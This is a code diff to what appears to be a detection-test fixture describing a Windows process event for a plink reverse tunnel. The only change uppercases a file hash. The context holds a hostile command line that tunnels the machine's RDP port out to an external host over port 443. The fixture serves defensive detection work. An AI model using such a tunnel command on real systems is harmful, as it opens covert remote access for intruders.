@@ -50,7 +50,7 @@ const plinkReverseTunnelEvent: TelemetryEvent = {
     "winlog.event_data.CurrentDirectory": "C:\\Users\\svc_report\\AppData\\Local\\Temp\\",
     "winlog.event_data.User": "SOLVIX\\svc_report",
     "winlog.event_data.IntegrityLevel": "Medium",
-    "winlog.event_data.Hashes": "SHA256=0fefa5d85e2cc9f24584a763e6f49790f562fdd7b26c82e770212cd1cc91e6f5",
+    "winlog.event_data.Hashes": "SHA256=0FEFA5D85E2CC9F24584A763E6F49790F562FDD7B26C82E770212CD1CC91E6F5",
     "winlog.event_data.ParentProcessId": 4488,
     "winlog.event_data.ParentImage": "C:\\Windows\\System32\\cmd.exe",
     "winlog.event_data.ParentCommandLine": "cmd.exe /c plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 203.0.113.11",
